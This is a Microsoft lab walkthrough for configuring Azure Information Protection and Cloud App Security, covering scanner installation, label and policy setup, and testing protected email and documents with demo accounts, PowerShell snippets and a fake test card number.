# Tips and Tricks
[:arrow_left: Home](#introduction)

There are a few extras throughout this lab that are designed to make your lab experience a smooth and simple process.  Below are some icons you should watch out for that will save you time during each task.

## Interactive Elements

- Each task contains a series of steps required for successful completion of the lab.  To track your progress throughout the lab, check the Box to the left of the numbered series.  

	!IMAGE[6mfi1ekm.jpg](\Media\6mfi1ekm.jpg)

- When you see an instruction for switching computers, click on the **blue link** in the text to have that VM loaded automatically.

	!IMAGE[12i85vgl.jpg](\Media\12i85vgl.jpg)
- Throughout the lab, you will see text with a letter **T** in a square to the left.  This indicates that you can **click on the text** and it will **type it for you** in the VM.  **This will save you lots of time**.

	!IMAGE[cnyu1tdi.jpg](\Media\cnyu1tdi.jpg)

- The last interactive element you will see throughout the lab is the **Open Screenshot** text below many steps.  To reduce clutter, most screenshots have been configured to launch in a popup window.  The only ones left visible are ones that could cause issues if they are missed or if there are multiple elements that are easier to understand with visual representation.

	!IMAGE[n4cqn070.jpg](\Media\n4cqn070.jpg)

## Additional Information

There are also Knowledge Items, Notes, and Hints throughout the lab.

- Knowledge Items are used to provide additional information about a topic related to the task or step.  These are often collapsed to reduce the amount of space they use, but it is recommended that you review these items if you want more information on the subject.

	!IMAGE[8g9nif1j.jpg](\Media\8g9nif1j.jpg)
- Notes are steps that do not require action or modification of any elements.  This includes general observations and reviewing the results of previous steps.

	!IMAGE[kxrbzsr2.jpg](\Media\kxrbzsr2.jpg)
- Hints are recommendations or observations that help with the completion of a step.

### Exchange Auditing Configuration
[:arrow_up: Top](#mcas-environment-preparation)

In addition to enabling auditing in Office 365, some applications like Exchange Online require extra configuration. After enabling auditing at the Office 365 level, we have to enable auditing at the mailBox level. We will perform this configuration before going to the labs.

1. [] On the desktop, right-click on **EnableMailboxAudit.ps1** and click **Run with PowerShell**.

	> [!KNOWLEDGE] The following commands will be run to connect to Exchange Online and Enable Mailbox Auditing on the Admin account.
    >
	> ```$UserCredential = Get-Credential```
    >
	> ```$Session = New-PSSession –ConfigurationName Microsoft.Exchange –ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $UserCredential –Authentication Basic -AllowRedirection```
	>
	>```Import-PSSession $Session```
    >
	> ```Get-MailBox -ResultSize Unlimited -Filter {RecipientTypeDetails -eq "UserMailBox"} | Set-MailBox -AuditEnabled $true```
    >
	> ```Get-MailBox admin | fl audit*```
    
    > [!ALERT] When you create new mailBoxes, **auditing is not enabled** by default. You will have to use the same commands again to enable auditing for those newly created mailBoxes.

## Connect Office 365 and Box to Cloud App Security 
[:arrow_up: Top](#mcas-environment-preparation)

To connect Cloud App Security to Office 365, you will have to use the Office 365 app connector. App connectors use the APIs of app providers to enable greater visibility and control by Microsoft Cloud App Security over the apps you connect to.  We will also use this method to show integration with the 3rd Party API for Box.

1. [] Open a new in Private tab in your browser and navigate to ```https://portal.cloudappsecurity.com```

2. [] Go to the gear icon and select **App connectors**.

    !IMAGE[App connector](\Media\conf-appconnector.png "App connector")

# Azure Information Protection
[:arrow_left: Home](#introduction)
## Overview

Azure Information Protection (AIP) is a cloud-based solution that can help organizations to protect sensitive information by classifying and (optionally) encrypting documents and emails on Windows, Mac, and Mobile devices. This is done using an organization defined classification taxonomy made up of labels and sub-labels. These labels may be applied manually by users, or automatically by administrators via defined rules and conditions.

The phases of AIP are shown in the graphic below.  

!IMAGE[Phases.png](\Media\Phases.png)

In this lab, we will give you options for addressing each of these phases using various features of AIP.  

The [AIP Scanner Discovery](#aip-scanner-discovery) exercise, will guide you through performing **Discovery using the AIP scanner**. We recommend that everyone complete this exercise first as this step is important to help show the current state of sensitive data in on-premises repositories. This enables you to make data based risk decisions that can help drive appropriate levels of urgency around the rest of your AIP deployment. :clock10: 10-15 min

The [Base Configuration](#base-configuration) exercise, contains information on configuring and testing **Global and Scoped Policy and Labels**. This will also include demonstrating **Recommended and Automatic labeling via the AIP client in Office 365 on Windows 10**. This is the longest exercise in the lab as it requires configuration of policy and the use of multiple clients.  We recommend this exercise if you have minimal experience with AIP. :clock10: 30-45 min

The [Bulk Classification](#bulk-classification) exercise, shows how to manually classify, label, and protect content using the Windows integration features of the AIP client. :clock10: 5 min

The [AIP Scanner Classification, Labeling, and Protection](#aip-scanner-classification-labeling-and-protection) exercise, will show how to use the **AIP scanner in Enforce mode** to take advantage of features like Automatic Conditions to help you **Classify, Label, and Protect** the discovered information easily. This exercise has a dependancy on completion of the AIP Scanner Dicovery exercise. :clock10: 5-10 min

The [Security and Compliance Center](#security-and-compliance-center) exercise, will help you understand how to **Enable and Publish labels in the Security and Compliance Center** so they can be used with Mac, Mobile, ISVs (like Adobe PDF), and other unified clients.  We will demonstrate this functionality using the Adobe PDF reader. :clock10: 5-10 min

In the [AIP Analytics Dashboards](#aip-analytics-dashboards) exercise, we will show how to **Monitor AIP Usage, User Activity, and Data Risk** using the new Azure Log Analytics dashboards built into the AIP Azure Portal. :clock10: 5 min

In the [Exchange IRM](#exchange-online-irm-capabilities) exercise, we will use Exchange PowerShell to create a Mail Flow Rule to prevent sensitive information from leaving your network in the clear.  We will also create a mail flow rule that prevents internal protected messages from accidentally being sent to external recipients who will be unable to open the content. :clock10: 10-15 min

Click on one of the options below to begin. At the end of each section, there will be a summary and links to the other sections so you may continue from that point.

# AIP Scanner Discovery
[:arrow_left: Home](#azure-information-protection)

Even before configuring an AIP classification taxonomy, customers can scan and identify files containing sensitive information based on the built-in sensitive information types included in the Microsoft Classification Engine.  

!IMAGE[ahwj80dw.jpg](\Media\ahwj80dw.jpg)

Often, this can help drive an appropriate level of urgency and attention to the risk customers face if they delay rolling out AIP classification and protection.  

In this exercise, we will install the AIP scanner and run it against repositories in discovery mode.  Later in this lab (after configuring labels and conditions), we will revisit the scanner to perform automated classification, labeling, and protection of sensitive documents. This Exercise will walk you through the items below.

- [Installing the AIP Scanner Service](#installing-the-aip-scanner-service)
- [Creating Azure AD Applications for the AIP Scanner](#creating-azure-ad-applications-for-the-aip-scanner)

---
## AIP Scanner Setup

In this task we will install the AIP scanner binaries and create the Azure AD Applications necessary for authentication.

### Installing the AIP Scanner Service

The first step in configuring the AIP Scanner is to install the service and connect the database.  This is done with the Install-AIPScanner cmdlet that is provided by the AIP Client software.  The AIPScanner service account has been pre-staged in Active Directory for convenience.

1. [] Switch to @lab.VirtualMachine(Scanner01).SelectLink and log in using the password +++@lab.VirtualMachine(Client01).Password+++.

1. [] Open an **Administrative PowerShell Window** and type ```C:\Users\LabUser\Desktop\InstallScanner.ps1``` and press **Enter**. 

1. [] In the popup box, click **OK** to accept the default of **Scanner01**.

	> [!NOTE] We have preconfigured SQL Server on Scanner01 with a **default instance**. If using a **named instance** or **SQL Server Express**, you would populate this with **ServerName\\InstanceName** or **ServerName\\SqlExpress** respectively.

3. [] When prompted, provide the credentials for the **local** AIP scanner service account.
	
	```Contoso\AIPScanner```

	```Somepass1```

	^IMAGE[Open Screenshot](\Media\pc9myg9x.jpg)

	> [!KNOWLEDGE] This script installs the AIP scanner Service account using the **local domain user** account provisioned for the AIP Scanner. This account will need to be provided **read** access to **all repositories** that need to be scanned during **discovery**.  
	>
	> When you begin **classifying and labeling** files with the AIP scanner, this account will also need **write** access to the repositories, so this is something you should consider during rights assignment. 
	>
	> This script will run the code below. This script is available online at https://aka.ms/labscripts
	>
	> Add-Type -AssemblyName Microsoft.VisualBasic
	> 
	> $SQL = [Microsoft.VisualBasic.Interaction]::InputBox('Enter the name of your SQL Server or Server\Instance', 'SQL Server', "Scanner01")
	>
	> Install-AIPScanner -SQLServerInstance $SQL
	
	^IMAGE[Open Screenshot](\Media\w7goqgop.jpg)

### Creating Azure AD Applications for the AIP Scanner

Now that you have installed the scanner bits, you need to get an Azure AD token for the scanner service account to authenticate so that it can run unattended. This requires registering both a Web app and a Native app in Azure Active Directory.  The commands below will do this in an automated fashion rather than needing to go into the Azure portal directly.

1. [] Next, on the desktop, right-click on **GenerateAuthToken.ps1** and click **Run with PowerShell**.
1. [] When prompted, provide the username and password below. 
	
	```@lab.CloudCredential(134).Username```
	
	```@lab.CloudCredential(134).Password```

	> [!HINT] This will create a new **Web App Registration**, **Native App Registration**, and associated **Service Principals** in Azure AD. 
	>
	> Next, the script will output a new text file containing the **Set-AIPAuthentication** command and the **required values to generate the authentication token** for **any** AIP scanner server in an environment.
	
	> [!KNOWLEDGE] This script will run the code below. This script is available online at https://aka.ms/labscripts
	>
	> New-AzureADApplication -DisplayName AIPOnBehalfOf -ReplyUrls http://localhost
	> $WebApp = Get-AzureADApplication -Filter "DisplayName eq 'AIPOnBehalfOf'"
	> New-AzureADServicePrincipal -AppId $WebApp.AppId
	> $WebAppKey = New-Guid
	> $Date = Get-Date
	> New-AzureADApplicationPasswordCredential -ObjectId $WebApp.ObjectID -startDate $Date -endDate $Date.AddYears(1) -Value $WebAppKey.Guid -CustomKeyIdentifier "AIPClient"
	>
	> $AIPServicePrincipal = Get-AzureADServicePrincipal -All $true | ? {$_.DisplayName -eq 'AIPOnBehalfOf'}
	> $AIPPermissions = $AIPServicePrincipal | select -expand Oauth2Permissions
	> $Scope = New-Object -TypeName "Microsoft.Open.AzureAD.Model.ResourceAccess" -ArgumentList $AIPPermissions.Id,"Scope"
	> $Access = New-Object -TypeName "Microsoft.Open.AzureAD.Model.RequiredResourceAccess"
	> $Access.ResourceAppId = $WebApp.AppId
	> $Access.ResourceAccess = $Scope
	>
	> New-AzureADApplication -DisplayName AIPClient -ReplyURLs http://localhost -RequiredResourceAccess $Access -PublicClient $true
	> $NativeApp = Get-AzureADApplication -Filter "DisplayName eq 'AIPClient'"
	> New-AzureADServicePrincipal -AppId $NativeApp.AppId
	>
    > "Set-AIPAuthentication -WebAppID " + $WebApp.AppId + " -WebAppKey " + $WebAppKey.Guid + " -NativeAppID " + $NativeApp.AppId | Out-File ~\Desktop\Set-AIPAuthentication.txt
	> Start ~\Desktop\Set-AIPAuthentication.txt

1. [] Leave the notepad window open in the background.
1. [] **Click on the Start menu** and type ```PowerShell```, right-click on the PowerShell program, and click **Run as a different user**.

	!IMAGE[zgt5ikxl.jpg](\Media\zgt5ikxl.jpg)

1. [] When prompted, enter the username and password below and click **OK**.

	```Contoso\AIPScanner``` 

	```Somepass1```

1. [] Return to the **Notepad** window and copy the **full Set-AIPAuthentication** command into this window and run it.
1. [] When prompted, enter the username and password below:

	```AIPScanner@@lab.CloudCredential(134).TenantName```

	```Somepass1```

	^IMAGE[Open Screenshot](\Media\qfxn64vb.jpg)

1. [] In the Permissions requested window, click **Accept**.

   !IMAGE[nucv27wb.jpg](\Media\nucv27wb.jpg)
   
	>[!knowledge] You will a message like the one below in the PowerShell window once complete.

1. [] **Close the PowerShell window**.
1. [] Next, in the **Admin PowerShell window**, run the command below.

	```Restart-Service AIPScanner```
   
---

## Configuring Repositories 

In this task, we will configure repositories to be scanned by the AIP scanner.  As previously mentioned, these can be any type of CIFS file shares including NAS devices sharing over the CIFS protocol.  Additionally, On premises SharePoint 2010, 2013, and 2016 document libraries and lists (attachements) can be scanned.  You can even scan entire SharePoint sites by providing the root URL of the site.  There are several optional 

> [!NOTE] SharePoint 2010 is only supported for customers who have extended support for that version of SharePoint.

The next task is to configure repositories to scan.  These can be on-premises SharePoint 2010, 2013, or 2016 document libraries and any accessible CIFS based share.

1. [] In the **Admin PowerShell window**, type ```C:\Users\LabUser\Desktop\ConfigureRepository.ps1``` and press **Enter**.

	> [!HINT] This command configures a **CIFS fileshare** repository and a **SharePoint document library** repository then **displays the configuration** to verify they were added.

	^IMAGE[Open Screenshot](\Media\scanner-repo.png)

    > [!KNOWLEDGE] The script runs the code below. This script is available online at https://aka.ms/labscripts
	>
	> Add-AIPScannerRepository -Path http://Scanner01/documents -SetDefaultLabel Off
	>
	> Add-AIPScannerRepository -Path \\Scanner01\documents -SetDefaultLabel Off
	>
	> Get-AIPScannerRepository
   
	>[!HINT] Notice that we added the **-SetDefaultLabel Off** switch to each of these repositories.  This is useful to prevent any Default labels from applying to files that do not match a condition when we do the enforced scan. This is optional and may be removed if desired.

## Running Sensitive Data Discovery 
[:arrow_up: Top](#configuring-aip-scanner-for-discovery)

1. [] In the **Admin PowerShell window**, type ```C:\Users\LabUser\Desktop\StartDiscovery.ps1``` and press **Enter**.

	> [!HINT] This command sets the global configuration of the AIP scanner to use **any custom conditions** that you have specified for labels in the Azure Information Protection policy, and the list of all **default sensitive information types** that are available to specify as conditions for labels.
	>
	> Although the scanner will discover documents to classify, it will not classify them because the configuration for the scanner is set to Discover only mode (Enforce Off).
	>
	> This command also starts the **initial discovery scan**.

	> [!KNOWLEDGE] The script runs the code below. This script is available online at https://aka.ms/labscripts
	>
	> Set-AIPScannerConfiguration -DiscoverInformationTypes All -Enforce Off
	>
	> Start-AIPScan
	
1. [] Right-click on the **Windows** button in the lower left-hand corner and click on **Event Viewer**.

	^IMAGE[Open Screenshot](\Media\cjvmhaf0.jpg)
1. [] Expand **Application and Services Logs** and click on **Azure Information Protection**.

	^IMAGE[Open Screenshot](\Media\dy6mnnpv.jpg)

	> [!ALERT] If you see a **.NET exception**, press **OK**. This is due to SharePoint startup in the VM environment. This event **must be acknowledged** to complete the discovery scan.

	> [!NOTE] You will see an event like the one below when the scanner completes the cycle. 
	>
	>!IMAGE[agnx2gws.jpg](\Media\agnx2gws.jpg)

1. [] Next, switch to @lab.VirtualMachine(Client01).SelectLink and log in using the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open a **File Explorer** window, and browse to ```\\Scanner01.contoso.azure\c$\users\aipscanner\AppData\Local\Microsoft\MSIP\Scanner\Reports```. Use the credentials below to authenticate:

	```Contoso\LabUser```
	
	```Pa$$w0rd```

1. [] Review the summary txt and detailed csv files available there.  

	>[!Hint] Since there are no Automatic conditions configured yet, the scanner found no matches for the files scanned despite most of them containing sensitive data.
	>
	>!IMAGE[aukjn7zr.jpg](\Media\aukjn7zr.jpg)
	>
	>The details contained in the DetailedReport.csv can be used to identify the types of sensitive data you need to create AIP rules for in the Azure Portal.
	>
	>!IMAGE[9y52ab7u.jpg](\Media\9y52ab7u.jpg)

	>[!NOTE] We will revisit this information later in the lab to review discovered data and create Sensitive Data Type to Classification mappings.

	>[!ALERT] If you see any failures, it is likely due to SharePoint startup in the VM environment.  If you rerun Start-AIPScan on Scanner01 all files will successfully scan.  This should not happen in a production environment.

# AIP Scanner Discovery Exercise Complete

In this exercise, we installed the AIP scanner and performed a discovery scan against an on premises CIFS repository and SharePoint document library.  Although this was a very limited demonstration of the capabilities of the AIP scanner for discovery, it helps to show how quickly you can configure this tool and get actionable information which can be used to make data driven decisions about your security posture.

# Base Configuration
[:arrow_left: Home](#azure-information-protection)

This exercise demonstrates using the Azure Information Protection blade in the Azure portal to configure policies and sub-labels.  We will create a new sub-label and configure protection and then modify an existing sub-label.  We will also create a label that will be scoped to a specific group.  

Next, we will configure AIP Global Policy to use the General sub-label as default, and finally, we will configure a scoped policy to use the new scoped label by default for Word, Excel, and PowerPoint while still using General as default for Outlook. This Exercise will walk you through the items below.


- [Creating, Configuring, and Modifying Sub-Labels](#creating-configuring-and-modifying-sub-labels)
- [Configuring Global Policy](#configuring-global-policy)
- [Creating a Scoped Label and Policy](#creating-a-scoped-label-and-policy)
- [Configuring Advanced Policy Settings](#configuring-advanced-policy-settings)
- [Defining Recommended and Automatic Conditions](#defining-recommended-and-automatic-conditions)

---
## Creating, Configuring, and Modifying Sub-Labels

In this task, we will configure a label protected for internal audiences that can be used to help secure sensitive data within your company.  By limiting the audience of a specific label to only internal employees, you can dramatically reduce the risk of unintentional disclosure of sensitive data and help reduce the risk of successful data exfiltration by bad actors.  

However, there are times when external collaboration is required, so we will configure a label to match the name and functionality of the Do Not Forward button in Outlook.  This will allow users to more securely share sensitive information outside the company to any recipient.  By using the name Do Not Forward, the functionality will also be familiar to what previous users of AD RMS or Azure RMS may have used in the past.

## Configuring Advanced Policy Settings
[:arrow_up: Top](#base-configuration)

There are many advanced policy settings that are useful to tailor your Azure Information Protection deployment to the needs of your environment.  In this task, we will cover one of the settings that is very complimentary when using scoped policies that have no default label or a protected default label.  Because the No Default Label Scoped Policy we created in the previous task uses a protected default label, we will be adding an alternate default label for Outlook to provide a more palatable user experience for those users.

1. [] In the Azure Information Protection blade, under **Classifications** on the left, click on **Labels** and then click on the **General** label.

    ^IMAGE[Open Screenshot](\Media\rvn4xorx.jpg)

1. [] In the Label: General blade, scroll to the bottom and copy the **Label ID** and close the blade using the **X** in the upper right-hand corner.

## Defining Recommended and Automatic Conditions
[:arrow_up: Top](#base-configuration)

One of the most powerful features of Azure Information Protection is the ability to guide your users in making sound decisions around safeguarding sensitive data.  This can be achieved in many ways through user education or reactive events such as blocking emails containing sensitive data. 

However, helping your users to properly classify and protect sensitive data at the time of creation is a more organic user experience that will achieve better results long term.  In this task, we will define some basic recommended and automatic conditions that will trigger based on certain types of sensitive data.

1. [] Under **Dashboards** on the left, click on **Data discovery (Preview)** to view the results of the discovery scan we performed previously.

	!IMAGE[Dashboard.png](\Media\Dashboard.png)

	> [!KNOWLEDGE] Notice that there are no labeled or protected files shown at this time.  This uses the AIP P1 discovery functionality available with the AIP Scanner. Only the predefined Office 365 Sensitive Information Types are available with AIP P1 as Custom Sensitive Information Types require automatic conditions to be defined, which is an AIP P2 feature.

	> [!NOTE] Now that we know the sensitive information types that are most common in this environment, we can use that information to create **Recommended** conditions that will help guide user behavior when they encounter this type of data.

	> [!ALERT] If no data is shown, it may still be processing. Continue with the lab and come back to see the results later.

1. [] Under **Classifications** on the left, click **Labels** then expand **Confidential**, and click on **Contoso Internal**.

	^IMAGE[Open Screenshot](\Media\jyw5vrit.jpg)
1. [] In the Label: Contoso Internal blade, scroll down to the **Configure conditions for automatically applying this label** section, and click on **+ Add a new condition**.

	!IMAGE[cws1ptfd.jpg](\Media\cws1ptfd.jpg)
1. [] In the Condition blade, in the **Select information types** search Box, type ```EU``` and check the Boxes next to the **items shown below**.

	!IMAGE[xaj5hupc.jpg](\Media\xaj5hupc.jpg)
1. [] Next, before saving, replace EU in the search bar with ```credit``` and check the Box next to **Credit Card Number**.

	^IMAGE[Open Screenshot](\Media\9rozp61b.jpg)
1. [] Click **Save** in the Condition blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\41o5ql2y.jpg)

	> [!Knowledge] By default the condition is set to Recommended and a policy tip is created with standardized text.
	>
	>  !IMAGE[qdqjnhki.jpg](\Media\qdqjnhki.jpg)

1. [] Click **Save** in the Label: Contoso Internal blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\rimezmh1.jpg)
1. [] Press the **X** in the upper right-hand corner to close the Label: Contoso Internal blade.

	^IMAGE[Open Screenshot](\Media\em124f66.jpg)
1. [] Next, expand **Highly Confidential** and click on the **All Employees** sub-label.

	^IMAGE[Open Screenshot](\Media\2eh6ifj5.jpg)
1. [] In the Label: All Employees blade, scroll down to the **Configure conditions for automatically applying this label** section, and click on **+ Add a new condition**.

	^IMAGE[Open Screenshot](\Media\8cdmltcj.jpg)
1. [] In the Condition blade, select the **Custom** tab and enter ```Password``` for the **Name** and in the textBox below **Match exact phrase or pattern**, type ```pass@word1```.

	!IMAGE[ra7dnyg6.jpg](\Media\ra7dnyg6.jpg)
1. [] Click **Save** in the Condition blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\ie6g5kta.jpg)
1. [] In the Labels: All Employees blade, in the **Configure conditions for automatically applying this label** section, click **Automatic**.

   !IMAGE[245lpjvk.jpg](\Media\245lpjvk.jpg)

	> [!HINT] The policy tip is automatically updated when you switch the condition to Automatic.

1. [] Click **Save** in the Label: All Employees blade and **OK** to the Save settings prompt.

# Testing AIP Policies
[:arrow_left: Home](#azure-information-protection)

Now that you have 3 test systems with users being affected by different policies configured, we can start testing these policies.  This exercise will run through various scenarios to demonstrate the use of AIP global and scoped policies and show the functionality of recommended and automatic labeling. This Exercise will walk you through the items below.

- [Testing User Defined Permissions](#testing-user-defined-permissions)
- [Testing Global Policy](#testing-global-policy)
- [Testing Scoped Policy](#testing-scoped-policy)
- [Testing Recommended and Automatic Classification](#testing-recommended-and-automatic-classification)

> [!ALERT] If you see a warning about a metered connection in Office, click **Connect anyway** to allow Office to connect.  If you do not do this you will get errors when connecting to the AIP service. The VMs are set to metered to increase network speed.

---

## Testing User Defined Permissions
[:arrow_up: Top](#testing-aip-policies)

One of the most common use cases for AIP is the ability to send emails using User Defined Permissions (Do Not Forward). In this task, we will send an email using the Do Not Forward label to test that functionality.


1. [] On @lab.VirtualMachine(Client03).SelectLink, log in using the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Launch Microsoft Outlook, and click **Accept and start Outlook**.
3. [] In the username Box, type ```EvanG@@lab.cloudcredential(134).TenantName``` and click **Connect**.
4. [] When prompted, type ```pass@word1``` and Sign in.
5. [] On the Use this account everywhere page, click **Yes** then click **Done**.
6. [] Once configuration completes, **uncheck the Box** to **Set up Outlook Mobile** and click **OK**.
7. [] **Close Outlook** and **reopen** to complete activation.
8. [] Once Outlook opens, if you receive a metered connection warning, click **Connect anyway**.
9. [] Click on the **New email** button.

  !IMAGE[6wan9me1.jpg](\Media\6wan9me1.jpg)

	> [!KNOWLEDGE] Note that the **Sensitivity** is set to **General** by default.
	>
	> !IMAGE[5esnhwkw.jpg](\Media\5esnhwkw.jpg)

8. [] Send an email to **Adam Smith** and **Alice Anderson** (```Adam Smith;Alice Anderson```). You may **optionally add an external email address** (preferably from a major social provider like gmail, yahoo, or outlook.com) to test the external recipient experience. For the **Subject** and **Body** type ```Test Do Not Forward Email```.

  ^IMAGE[Open Screenshot](\Media\h0eh40nk.jpg)

9. [] In the Sensitivity Toolbar, click on **Confidential** and then the **Do Not Forward** sub-label and click **Send**.

  !IMAGE[w8j1w1lm.jpg](\Media\w8j1w1lm.jpg)

	> [!Knowledge] If you receive the error message below, click on the Confidential \ Contoso Internal sub-label to force the download of your AIP identity certificates, then follow the steps above to change the label to Confidential \ Do Not Forward.
	>
	> !IMAGE[6v6duzbd.jpg](\Media\6v6duzbd.jpg)

10. [] Switch over to @lab.VirtualMachine(Client01).SelectLink, log in using the password +++@lab.VirtualMachine(Client01).Password+++ and open Outlook. 
11. [] Run through setup, this time using the credentials ```AdamS@@lab.CloudCredential(134).TenantName``` and ```pass@word1```. 
12. [] Review the email in Adam Smith’s Outlook.  You will notice that the email is automatically shown in Outlook natively.

   !IMAGE[0xby56qt.jpg](\Media\0xby56qt.jpg)

	> [!Hint] The **Do Not Forward** protection template will normally prevent the sharing of the screen and taking screenshots when protected documents or emails are loaded.  However, since this screenshot was taken within a VM, the operating system was unaware of the protected content and could not prevent the capture.  
	>
	>It is important to understand that although we put controls in place to reduce risk, if a user has view access to a document or email they can take a picture with their smartphone or even retype the message. That said, if the user is not authorized to read the message then it will not even render and we will demonstrate that next.

	> [!KNOWLEDGE] If you elected to send a Do Not Forward message to an external email, you will have an experience similar to the images below.  These captures are included to demonstrate the functionality for those that chose not to send an external message.
	>
	> !IMAGE[tzj04wi9.jpg](\Media\tzj04wi9.jpg)
	> 
	> Here the user has received an email from Evan Green and they can click on the **Read the message** button.
	>
	>!IMAGE[wiefwcho.jpg](\Media\wiefwcho.jpg)
	>
	>Next, the user is given the option to either log in using the social identity provider (**Sign in with Google**, Yahoo, Microsoft Account), or to **sign in with a one-time passcode**.
	>
	>If they choose the social identity provider login, it should use the token previously cached by their browser and display the message directly.
	>
	>If they choose one-time passcode, they will receive an email like the one below with the one-time passcode.
	>
	>!IMAGE[m6voa9xi.jpg](\Media\m6voa9xi.jpg)
	>
	>They can then use this code to authenticate to the Office 365 Message Encryption portal.
	>

## Testing Global Policy
[:arrow_up: Top](#testing-aip-policies)

In this task, we will create a document and send an email to demonstrate the functionality defined in the Global Policy.

1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] In Microsoft Outlook, click on the **New email** button.

	^IMAGE[Open Screenshot](\Media\6wan9me1.jpg)

1. [] Send an email to Adam Smith, Alice Anderson, and yourself (```Adam Smith;Alice Anderson;@lab.User.Email```).  For the **Subject** and **Body** type ```Test Contoso Internal Email```.

	^IMAGE[Open Screenshot](\Media\9gkqc9uy.jpg)

1. [] In the Sensitivity Toolbar, click on **Confidential** and then **Contoso Internal** and click **Send**.

  ^IMAGE[Open Screenshot](\Media\yhokhtkv.jpg)

1. [] On @lab.VirtualMachine(Client01).SelectLink, log in using the password +++@lab.VirtualMachine(Client01).Password+++ and observe that you are able to open the email natively in the Outlook client. Also observe the **header text** that was defined in the label settings.

	!IMAGE[bxz190x2.jpg](\Media\bxz190x2.jpg)
	
1. [] In your email, note that you will be unable to open this message.  This experience will vary depending on the client you use (the image below is from Outlook 2016 for Mac) but they should have similar messages after presenting credentials. Since this is not the best experience for the recipient, later in the lab we will configure Exchange Online Mail Flow Rules to prevent content classified with internal only labels from being sent to external users.
	
	!IMAGE[52hpmj51.jpg](\Media\52hpmj51.jpg)

## Testing Scoped Policy
[:arrow_up: Top](#testing-aip-policies)

In this task, we will create a document and send an email from one of the users in the Legal group to demonstrate the functionality defined in the first exercise. We will also show the behavior of the No Default Label policy on documents.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] In Microsoft Outlook, click on the **New email** button.
	
	^IMAGE[Open Screenshot](\Media\ldjugk24.jpg)
	
1. [] Send an email to Alice Anderson and Evan Green (```Alice Anderson;Evan Green```).  For the **Subject** and **Body** type ```Test Highly Confidential Legal Email```.
1. [] In the Sensitivity Toolbar, click on **Highly Confidential** and the **Legal Only** sub-label, then click **Send**.

	^IMAGE[Open Screenshot](\Media\ny1lwv0h.jpg)
1. [] Switch to @lab.VirtualMachine(Client02).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
11. [] Run through setup, this time using the credentials ```AliceA@@lab.CloudCredential(134).TenantName``` and ```pass@word1```. 
12. [] Review the email in Alice Anderson’s Outlook. You should be able to open the message natively in the client as Alice.

	!IMAGE[qeqtd2yr.jpg](\Media\qeqtd2yr.jpg)
1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
2. [] Click on the email. You should be unable to open the message as Evan.

	!IMAGE[6y99u8cl.jpg](\Media\6y99u8cl.jpg)

	> [!Knowledge] You may notice that the Office 365 Message Encryption wrapper message is displayed in the preview pane.  It is important to note that the content of the email is not displayed here.  The content of the message is contained within the encrypted message.rpmsg attachment and only authorized users will be able to decrypt this attachment.
	>
	>!IMAGE[w4npbt49.jpg](\Media\w4npbt49.jpg)
	>
	>If an unauthorized recipient clicks on **Read the message** to go to the OME portal, they will be presented with the same wrapper message.  Like the external recipient from the previous task, this is not an ideal experience. So, you may want to use a mail flow rule to manage scoped labels as well.
	>
	>!IMAGE[htjesqwe.jpg](\Media\htjesqwe.jpg)

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open **Microsoft Word**.
1. [] Create a new **Blank document** and type ```This is a test document``` and **save the document**.

	> [!ALERT] When you click **Save**, you will be prompted to choose a classification.  This is a result of having **None** set as the default label in the scoped policy while requiring all documents to be labeled.  This is a useful for driving **active classification decisions** by specific groups within your organization.  Notice that Outlook still has a default of **General** because of the Advanced setting we added to the scoped policy.  **This is recommended** because user send many more emails each day than they create documents. Actively forcing users to classify each email would be an unpleasant user experience whereas they are typically more understanding of having to classify each document if they are in a sensitive department or role.

1. [] Choose a classification to save the document.

---

## Testing Recommended and Automatic Classification
[:arrow_up: Top](#testing-aip-policies)

In this task, we will test the configured recommended and automatic conditions we defined in Exercise 1.  Recommended conditions can be used to help organically train your users to classify sensitive data appropriately and provides a method for testing the accuracy of your dectections prior to switching to automatic classification.  Automatic conditions should be used after thorough testing or with items you are certain need to be protected. Although the examples used here are fairly simple, in production these could be based on complex regex statements or only trigger when a specific quantity of sensitive data is present.

1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Launch **Microsoft Word**.
1. [] In Microsoft Word, create a new **Blank document** and type ```My AMEX card number is 344047014854133. The expiration date is 09/28, and the CVV is 4368``` and **save** the document.

	> [!NOTE] This card number is a fake number that was generated using the Credit Card Generator for Testing at [https://developer.paypal.com/developer/creditCardGenerator/](https://developer.paypal.com/developer/creditCardGenerator/).  The Microsoft Classification Engine uses the Luhn Algorithm to prevent false positives so when testing, please make sure to use valid numbers.

1. [] Notice that you are prompted with a recommendation to change the classification to Confidential \ Contoso Internal. Click on **Change now** to set the classification and protect the document.

	!IMAGE[url9875r.jpg](\Media\url9875r.jpg)
	> [!Knowledge] Notice that, like the email in Task 2 of this exercise, the header value configured in the label is added to the document.
	>

# Bulk Classification
[:arrow_left: Home](#azure-information-protection)

In this task, we will perform bulk classification using the built-in functionality of the AIP client.  This can be useful for users that want to classify/protect many documents that exist in a central location or locations identified by scanner discovery.  Because this is done manually, it is an AIP P1 feature.

1. [] On @lab.VirtualMachine(Scanner01).SelectLink, log in with the password +++@lab.VirtualMachine(Scanner01).Password+++.
2. [] Browse to the **C:\\**.
3. [] Right-click on the PII folder and select **Classify and Protect**.

# AIP Scanner Classification, Labeling, and Protection
[:arrow_left: Home](#azure-information-protection)

The Azure Information Protection scanner allows you to  classify and protect sensitive information stored in on-premises CIFS file shares and SharePoint sites.  

In this exercise, you will configure conditions for automatic classification.  After that, we will run the AIP Scanner in enforce mode to classify and protect the identified sensitive data. This Exercise will walk you through the items below.

- [Defining Automatic Conditions](#defining-automatic-conditions)
- [Enforcing Configured Rules](#enforcing-configured-rules)
